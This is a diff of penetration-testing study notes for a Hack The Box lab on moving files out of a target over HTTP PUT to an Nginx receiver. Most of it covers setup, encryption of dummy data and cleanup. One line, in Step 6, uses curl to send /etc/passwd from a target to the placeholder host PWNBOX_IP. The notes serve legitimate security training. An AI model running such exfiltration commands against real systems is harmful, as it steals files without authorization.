@@ -930,14 +930,45 @@ The recovered text should match the original. After encryption, transfer the enc
 
 ## 7. Catching files over HTTP/S
 
-Nginx can provide a narrow upload endpoint using HTTP `PUT`.
+HTTP and HTTPS are commonly permitted through network firewalls, making web transfer useful when protocols such as SMB are unavailable. This section configures Nginx on the Pwnbox to accept file uploads through HTTP `PUT`.
+
+> The HTB configuration below is HTTP on TCP/9001. The port number does not provide encryption. For sensitive material, encrypt the file using Section 6 before uploading it or configure an approved HTTPS listener.
+
+### Transfer direction
+
+```text
+Target machine --HTTP PUT--> Pwnbox Nginx upload directory
+```
+
+The target runs `curl -T`; Nginx receives the request and writes the uploaded bytes into its storage directory.
+
+### Step 1: create the upload directory
+
+Run on the Pwnbox:
 
 ```bash
 sudo mkdir -p /var/www/uploads/SecretUploadDirectory
 sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
 ```
 
-Example `/etc/nginx/sites-available/upload.conf`:
+| Command part | Purpose |
+|---|---|
+| `mkdir -p` | Create the entire directory path if needed |
+| `/var/www/uploads` | Base Nginx upload location |
+| `chown -R` | Change ownership recursively |
+| `www-data:www-data` | Assign the directory to the Nginx user and group |
+
+The Nginx worker must have permission to write uploaded files.
+
+### Step 2: create the Nginx site
+
+Create `/etc/nginx/sites-available/upload.conf`:
+
+```bash
+sudo nano /etc/nginx/sites-available/upload.conf
+```
+
+Add:
 
 ```nginx
 server {
@@ -950,30 +981,247 @@ server {
 }
 ```
 
-Enable and restart:
+| Directive | Purpose |
+|---|---|
+| `listen 9001` | Listen for HTTP connections on TCP/9001 |
+| `location /SecretUploadDirectory/` | Match upload requests using this URL path |
+| `root /var/www/uploads` | Map the URL to the upload directory on disk |
+| `dav_methods PUT` | Permit HTTP `PUT` requests |
+
+The request path:
+
+```text
+/SecretUploadDirectory/users.txt
+```
+
+maps to:
+
+```text
+/var/www/uploads/SecretUploadDirectory/users.txt
+```
+
+### Step 3: enable and validate the site
+
+Create the enabled-site symlink:
 
 ```bash
-sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+```
+
+If the link already exists, do not create a duplicate. Validate the configuration before restarting:
+
+```bash
 sudo nginx -t
-sudo systemctl restart nginx
 ```
 
-Upload:
+Restart Nginx and confirm that TCP/9001 is listening:
 
 ```bash
-curl -T ./result.txt http://SERVER_IP:9001/SecretUploadDirectory/result.txt
+sudo systemctl restart nginx.service
+ss -lnpt | grep 9001
 ```
 
-Hardening requirements:
+### Step 4: troubleshoot startup problems
 
-- Use a dedicated directory and least-privileged ownership
-- Disable script execution and directory listing
-- Require authentication and HTTPS outside an isolated lab
-- Restrict source addresses and file size
-- Prevent overwrite if evidence preservation matters
-- Monitor `/var/log/nginx/error.log` and access logs
-- Check for port conflicts with `ss -lntp`
-- Remove the configuration and uploaded data when finished
+Read the latest Nginx errors:
+
+```bash
+tail -2 /var/log/nginx/error.log
+```
+
+Check what owns port 80:
+
+```bash
+ss -lnpt | grep 80
+```
+
+Inspect a reported process ID:
+
+```bash
+ps -ef | grep PID
+```
+
+On Pwnbox, port 80 may already be used by `websockify`. If Nginx fails because its default site also tries to bind to port 80, HTB removes the default enabled-site symlink:
+
+```bash
+sudo rm /etc/nginx/sites-enabled/default
+sudo nginx -t
+sudo systemctl restart nginx.service
+```
+
+Only remove that symlink after confirming the conflict. The custom upload server itself uses port 9001.
+
+### Step 5: test the receiver locally
+
+Create harmless test content:
+
+```bash
+echo "HTB Section 7 upload test" > /tmp/section7-test.txt
+```
+
+Upload it with HTTP `PUT`:
+
+```bash
+curl -T /tmp/section7-test.txt http://localhost:9001/SecretUploadDirectory/section7-test.txt
+```
+
+Verify the result:
+
+```bash
+sudo ls -l /var/www/uploads/SecretUploadDirectory/
+sudo cat /var/www/uploads/SecretUploadDirectory/section7-test.txt
+```
+
+`curl -T LOCAL_FILE URL` uploads `LOCAL_FILE` to the destination URL. The last URL component becomes the stored filename.
+
+### Step 6: upload from a target
+
+Find the Pwnbox VPN address:
+
+```bash
+ip -br addr show tun0
+```
+
+From a Linux target:
+
+```bash
+curl -T /path/to/file http://PWNBOX_IP:9001/SecretUploadDirectory/received-file
+```
+
+HTB's example uploads `/etc/passwd` and stores it as `users.txt`:
+
+```bash
+curl -T /etc/passwd http://PWNBOX_IP:9001/SecretUploadDirectory/users.txt
+```
+
+From a Windows Command Prompt with `curl.exe` available:
+
+```cmd
+curl.exe -T "C:\path\to\file" http://PWNBOX_IP:9001/SecretUploadDirectory/received-file
+```
+
+Verify on the Pwnbox:
+
+```bash
+sudo ls -l /var/www/uploads/SecretUploadDirectory/
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
+```
+
+### Step 7: check directory listing
+
+Browse to the listener using its actual port:
+
+```text
+http://PWNBOX_IP:9001/SecretUploadDirectory/
+```
+
+Nginx should not display an index of uploaded files because directory listing is disabled unless `autoindex on` is explicitly configured.
+
+### Combined Sections 6 and 7 engagement workflow
+
+This workflow demonstrates the safer sequence used during an authorized assessment:
+
+```text
+Create dummy data -> encrypt artifact -> stage it on target -> upload with PUT -> decrypt and verify
+```
+
+#### 1. Create and encrypt a harmless artifact
+
+On the Pwnbox:
+
+```bash
+mkdir -p "$HOME/section6-7-lab"
+cd "$HOME/section6-7-lab"
+echo "Dummy username: test-user" > scan-results.txt
+echo "Dummy password: NotARealPassword123!" >> scan-results.txt
+cat scan-results.txt
+```
+
+Encrypt it using the Section 6 OpenSSL pattern:
+
+```bash
+openssl enc -aes256 -iter 100000 -pbkdf2 -in scan-results.txt -out scan-results.enc
+ls -l
+```
+
+Test decryption before transferring it:
+
+```bash
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in scan-results.enc -out test-decrypted.txt
+cat test-decrypted.txt
+```
+
+#### 2. Stage the encrypted artifact on the Windows target
+
+Copy it into the RDP directory created during Section 5:
+
+```bash
+cp scan-results.enc "$HOME/filetransfer/"
+```
+
+Inside the RDP session, open `\\tsclient\linux` and copy `scan-results.enc` to the Windows Desktop.
+
+#### 3. Upload the encrypted artifact back through Nginx
+
+From Windows Command Prompt:
+
+```cmd
+curl.exe -T "%USERPROFILE%\Desktop\scan-results.enc" http://PWNBOX_IP:9001/SecretUploadDirectory/windows-scan-results.enc
+```
+
+From a Linux target, the equivalent is:
+
+```bash
+curl -T ./scan-results.enc http://PWNBOX_IP:9001/SecretUploadDirectory/linux-scan-results.enc
+```
+
+#### 4. Retrieve and decrypt the returned artifact
+
+On the Pwnbox:
+
+```bash
+cd "$HOME/section6-7-lab"
+sudo cp /var/www/uploads/SecretUploadDirectory/windows-scan-results.enc ./returned.enc
+sudo chown "$USER":"$USER" ./returned.enc
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in returned.enc -out returned-results.txt
+cat returned-results.txt
+```
+
+The recovered text must match the original dummy data. This demonstrates that HTTP carried the artifact while OpenSSL protected its contents. The HTTP request still exposes metadata such as the source, destination, filename, URL, timing, and transfer size.
+
+### Verification checklist
+
+- Nginx configuration passes `nginx -t`.
+- TCP/9001 is listening.
+- The HTTP client receives no upload error.
+- The expected file appears under `/var/www/uploads/SecretUploadDirectory/`.
+- The received size is plausible.
+- The encrypted artifact decrypts with the original password.
+- The recovered content matches the original content.
+
+### Security and cleanup
+
+- Never permit script execution in the upload directory.
+- Do not expose this unauthenticated HTTP receiver outside the authorized lab.
+- Use HTTPS and authentication for real sensitive transfers.
+- Encrypt sensitive artifacts before transfer and protect the password separately.
+- Keep directory listing disabled.
+- Restrict allowed source addresses and file sizes when possible.
+- Preserve required evidence before deleting test files.
+
+After the exercise, stop Nginx if it is no longer required:
+
+```bash
+sudo systemctl stop nginx.service
+```
+
+Remove only the disposable test artifacts you created:
+
+```bash
+sudo rm -f /var/www/uploads/SecretUploadDirectory/section7-test.txt
+sudo rm -f /var/www/uploads/SecretUploadDirectory/local-test.enc
+sudo rm -f /var/www/uploads/SecretUploadDirectory/windows-scan-results.enc
+```
 
 ---
 
